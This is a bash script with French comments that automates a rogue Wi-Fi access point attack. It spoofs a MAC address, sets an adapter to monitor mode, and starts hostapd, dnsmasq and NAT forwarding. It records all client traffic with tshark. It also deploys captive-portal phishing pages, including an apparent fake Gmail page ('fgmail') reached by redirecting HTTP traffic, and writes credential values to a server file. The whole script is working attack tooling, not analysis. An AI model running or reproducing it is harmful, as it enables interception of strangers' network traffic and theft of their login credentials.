#! /usr/bin/env bash


sudo ./stop.sh
varr=0
if [[ $1 = "r" ]]; then
	varr=1
	choice=$2
	if [[ $2 = "2" ]]; then
		second_choice=$4
	fi
else
	choice=$1
	if [[ $1 = "2" ]]; then
		second_choice=$3
	fi
fi
Int_Alfa=wlan1
Int_Wifi=wlan0
fap_name="wxdvwsd"
mac="00:c0:ca:b0:2d:26"
sudo ./interface.sh $mac

#on ecrit les informations dans les fichiers de configuration du projet
#ssid
sudo sed -i -r "s/^(ssid=).*/ssid=$fap_name/g" sc1/hostapd.conf
sudo sed -i -r "s/^(ssid=).*/ssid=$fap_name/g" sc2/hostapd.conf
sudo sed -i -r "s/^(ssid=).*/ssid=$fap_name/g" sc4/hostapd.conf
#int_alfa hostapd
sudo sed -i -r "s/^(interface=).*/interface=$Int_Alfa/g" sc1/hostapd.conf
sudo sed -i -r "s/^(interface=).*/interface=$Int_Alfa/g" sc2/hostapd.conf
sudo sed -i -r "s/^(interface=).*/interface=$Int_Alfa/g" sc4/hostapd.conf

#int_alfa dnsmasq
sudo sed -i -r "s/^(interface=).*/interface=$Int_Alfa/g" sc1/dnsmasq.conf
sudo sed -i -r "s/^(interface=).*/interface=$Int_Alfa/g" sc4/dnsmasq.conf

#int_alfa dhcp
sudo sed -i -r "s/^(INTERFACESv4=).*/INTERFACESv4=\"$Int_Alfa\"/g" /etc/default/isc-dhcp-server

#on met l'antenne alfa en mode monitor
sudo ifconfig $Int_Alfa down 
sudo iwconfig $Int_Alfa mode monitor
sudo ifconfig $Int_Alfa up 

#on configure l'antene en gw
sudo ifconfig $Int_Alfa up 192.168.1.1 netmask 255.255.255.0
sudo route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1

#on laisse passer le trafic
sudo iptables -F
sudo iptables --table nat --append POSTROUTING --out-interface $Int_Wifi -j MASQUERADE 
sudo iptables --append FORWARD --in-interface $Int_Alfa -j ACCEPT 
sudo bash -c "echo 1 > /proc/sys/net/ipv4/ip_forward"
sudo systemctl start ssh.service

    if [[ $varr = 1 ]]; then
	    sudo sed -i -r "s/^(bool_exec=).*/bool_exec=1/g" restart.sh	
	    sudo sed -i -r "s/^(fap_name=).*/fap_name=$fap_name/g" restart.sh	

	    case $choice in
		    2)
			    sudo sed -i -r "s/^(choice=).*/choice=$choice/g" restart.sh
			    sudo sed -i -r "s/^(second_choice=).*/second_choice=$second_choice/g" restart.sh	
			    if [[ $second_choice = 3 ]]; then
				    echo $5 > /var/www/cred.txt
				    echo $6 >> /var/www/cred.txt
			    fi
			    exit 0 
			    ;;
		    *)
			    sed -i -r "s/^(choice=).*/choice=$choice/g" restart.sh
			    exit 0 
			    ;;
	    esac     
    fi
    sudo sed -i -r "s/^(bool_exec=).*/bool_exec=0/g" restart.sh
    case $choice in 
	    1)
		    echo "[*] Starting"
		    echo "[*] Create AP"
		    sudo hostapd sc1/hostapd.conf -B 

		    echo "[*] Start DNS"
		    sudo dnsmasq -C sc1/dnsmasq.conf

		    echo "[*] start listening traffic"
		    sudo tshark -i $Int_Alfa -w saves_pcap/test.pcap -q &
		    ;;

	    2) 
		    sudo sed -i -r "s/^(sudo tshark -i).*/\1 $Int_Alfa -w ..\/saves_pcap\/test.pcap -q \&/" sc2/go.sh
		    case $second_choice in
			    1)
				    sudo cp sc2/conf/000-default.conf /etc/apache2/sites-enabled/000-default.conf
				    sudo rm -r /var/www/html/*
				    sudo cp -r sc2/portail_captif_sc2.1/* /var/www/html/
				    sudo cp sc2/conf/.htaccess /var/www/html/
				    sudo chmod 666 /var/www/html/.htaccess
				    sudo hostapd sc2/hostapd.conf -B
				    sudo tshark -i $Int_Alfa -w saves_pcap/test.pcap -q &
				    ;;

			    2)
				    sudo cp sc2/conf/000-default.conf /etc/apache2/sites-enabled/000-default.conf
				    sudo rm -r /var/www/html/*
				    sudo cp -r sc2/portail_captif_sc2.2/* /var/www/html/
				    sudo cp sc2/conf/.htaccess /var/www/html/
				    sudo chmod 666 /var/www/html/.htaccess
				    sudo hostapd sc2/hostapd.conf -B
				    sudo tshark -i $Int_Alfa -w saves_pcap/test.pcap -q &
				    ;;
			    3)
				    echo $4 > /var/www/cred.txt
				    echo $5 >> /var/www/cred.txt
				    cp sc2/conf/000-default.conf /etc/apache2/sites-enabled/000-default.conf
				    sudo rm -r /var/www/html/*
				    cp -r sc2/portail_captif_sc2.3/* /var/www/html/
				    cp sc2/conf/.htaccess /var/www/html/
				    sudo chmod 666 /var/www/html/.htaccess
				    sudo hostapd sc2/hostapd.conf -B
				    sudo tshark -i $Int_Alfa -w saves_pcap/test.pcap -q &
				    ;;
		    esac
		    ;;

	    3)
		    echo "en cours de dev sorry :/"
		    ;;
	    4)
		    sudo iptables -F
		    sudo iptables -A PREROUTING -t nat -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1
		    sudo iptables --table nat --append POSTROUTING --out-interface $Int_Wifi -j MASQUERADE
		    sudo iptables --append FORWARD --in-interface $Int_Alfa -j ACCEPT 
		    sudo rm -r /var/www/html/*
		    sudo rm -f /var/www/html/.htaccess
		    sudo cp -r sc4/fgmail/* /var/www/html/
		    sudo cp sc4/conf/.htaccess /var/www/html/.htaccess
		    sudo chmod 646 /var/www/html/.htaccess
		    sudo hostapd sc4/hostapd.conf -B

		    sudo dnsmasq -C sc4/dnsmasq.conf

		    sudo tshark -i $Int_Alfa -w saves_pcap/test.pcap -q &

		    ;;

	    * )
		    echo "$choice is not a valid option"
		    ;;
    esac

sleep 4
exit 0
